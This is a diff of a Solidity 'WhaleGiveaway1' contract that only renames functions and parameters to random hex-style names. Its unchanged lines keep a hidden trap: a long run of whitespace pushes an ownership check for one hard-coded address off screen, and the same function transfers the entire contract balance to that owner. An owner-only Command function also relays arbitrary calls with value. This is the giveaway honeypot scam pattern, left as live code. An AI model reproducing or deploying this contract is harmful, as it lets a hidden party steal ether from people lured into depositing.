@@ -21,7 +21,7 @@ contract WhaleGiveaway1
         }
     }
 
-    function _0xbb8a51()
+    function _0xbbd96b()
     payable
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
@@ -29,11 +29,11 @@ contract WhaleGiveaway1
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0x3dc5cf,bytes data)
+    function Command(address _0x1ab3c6,bytes data)
     payable
     public
     {
         require(msg.sender == Owner);
-        _0x3dc5cf.call.value(msg.value)(data);
+        _0x1ab3c6.call.value(msg.value)(data);
     }
 }
